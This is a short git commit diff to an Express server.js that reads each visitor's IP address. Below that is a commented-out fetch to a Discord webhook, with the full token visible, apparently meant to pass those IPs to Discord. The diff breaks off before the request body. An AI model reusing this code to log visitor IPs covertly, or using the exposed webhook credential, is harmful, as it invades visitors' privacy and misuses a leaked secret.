700ccebb1a4863aaed2df566f9117e39b7bb07bc
CoyoteDeveloper <74499310+CoyoteDeveloper@users.noreply.github.com>
2024-06-07 16:21:58 +0200

    Update server.js

--- server.js
+++ server.js
@@ -7,7 +7,7 @@ app.set('trust proxy', true);
 // Define a route for GET requests
 app.get('/', (req, res, next) => {
    const ip = req.header('x-forwarded-for') ||
-//						req.socket.remoteAddress;
+						req.socket.remoteAddress;
 //    fetch(
 //    "https://discord.com/api/webhooks/1241084793802850426/e-hMfQ1lVanHlHgavBGJESfwhshIxO0G9TfrZNoeI0GiuIjedUov7NvjHp00wDP2ySlQ", 
 //    {
